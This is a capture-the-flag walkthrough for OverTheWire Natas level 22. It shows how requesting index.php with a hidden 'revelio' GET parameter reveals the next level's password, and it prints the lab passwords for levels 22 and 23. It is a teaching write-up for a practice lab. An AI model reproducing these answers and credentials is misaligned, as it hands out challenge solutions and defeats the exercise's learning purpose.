# Natas CTF Solutions  

## Natas Level 22  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit the `revelio` parameter to bypass session-based authentication and access the password.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas22.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas22`  
- **Password:** Use the password from Natas Level 21:  
```
d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
```  

![Home_Page](https://github.com/user-attachments/assets/e381471b-6e98-4c56-a9fe-ecc74ec29bcb)

---

### **Step 3: Analyze the Source Code**  
- Upon checking the source code, it's clear that there’s a `GET` parameter named `revelio`.  
- If this parameter is set, the server generates the correct response.  

![Source_Code](https://github.com/user-attachments/assets/5710e06a-4ba8-43a3-97e3-660b815b51b9)

---

### **Step 4: Trigger the Parameter**  
1. Open the following URL directly in the browser or using Burp Suite:  
```  
http://natas22.natas.labs.overthewire.org/index.php?revelio  
```  

✅ Example Request in **Burp Suite**:  
```http
GET /index.php?revelio HTTP/1.1
Host: natas22.natas.labs.overthewire.org
```

![BurpSuite](https://github.com/user-attachments/assets/e8d6a903-fc1c-4e35-8f10-44abbe6c82c7)

---

### **Step 5: Output**  
If successful, the output will reveal the password for the next level:  
```  
The password for natas23 is: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs  
```  

---

### **✅ Password for Natas Level 23**  
```
dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
```  

---

## 💡 **Lessons Learned**  
✔️ **Hidden Parameters:** Developers often leave hidden parameters accessible through GET/POST requests.  
✔️ **Security Through Obscurity:** Relying on hidden parameters is not secure.  
✔️ **Testing with Debug Parameters:** Revealing debug parameters can expose sensitive information.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Source Code | ![Source_Code](https://github.com/user-attachments/assets/5710e06a-4ba8-43a3-97e3-660b815b51b9) |  
| Step 4 – Found Password | ![BurpSuite](https://github.com/user-attachments/assets/e8d6a903-fc1c-4e35-8f10-44abbe6c82c7) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 23**:  
👉 [http://natas23.natas.labs.overthewire.org](http://natas23.natas.labs.overthewire.org)  

---
